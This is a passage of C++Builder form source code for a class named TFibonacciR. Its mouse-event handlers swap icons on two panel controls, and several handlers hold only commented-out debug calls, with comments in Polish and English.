	 ImageListCursors->Count, P2->Image1->Picture->Icon );                           // ikona zielona (taki jak by³)


}
//---------------------------------------------------------------------------


void __fastcall TFibonacciR::ButtonP2MouseUp(TObject *Sender, TMouseButton Button,
          TShiftState Shift, int X, int Y)
{
//StatusInfo( P2->Left + "x" + P2->Top );
}
//---------------------------------------------------------------------------

void __fastcall TFibonacciR::ButtonP1MouseActivate(TObject *Sender, TMouseButton Button,
          TShiftState Shift, int X, int Y, int HitTest, TMouseActivate &MouseActivate)

{
//ShowMessage(1);   // on clic
}
//---------------------------------------------------------------------------

void __fastcall TFibonacciR::ButtonP1MouseEnter(TObject *Sender)
{
//  ShowMessage(2);   // vielokrotnie before move
	if (P1->Visible) {
			ImageListCursors->GetIcon( 3 %
		 ImageListCursors->Count, P1->Image1->Picture->Icon );                  // ikona yellow

	}
}
//---------------------------------------------------------------------------

void __fastcall TFibonacciR::ButtonP1MouseMove(TObject *Sender, TShiftState Shift,
          int X, int Y)
{                   // hover in
//StatusInfo(3);
}
//---------------------------------------------------------------------------

void __fastcall TFibonacciR::ButtonP1MouseLeave(TObject *Sender)
{               // hover out
//StatusInfo(5);
   ImageListCursors->GetIcon( 2 %
	 ImageListCursors->Count, P1->Image1->Picture->Icon );                           // ikona powodzenia

}
//---------------------------------------------------------------------------

void __fastcall TFibonacciR::Button10Click(TObject *Sender)
{

//	String a = "sth";
//	 bool b;
//	DoShowHint(a, (bool&)*&b, NULL );//	ShowBalloonTip( Button9, 1, "ik1",L"Zobacz punkty", 0,0 );

}
//---------------------------------------------------------------------------

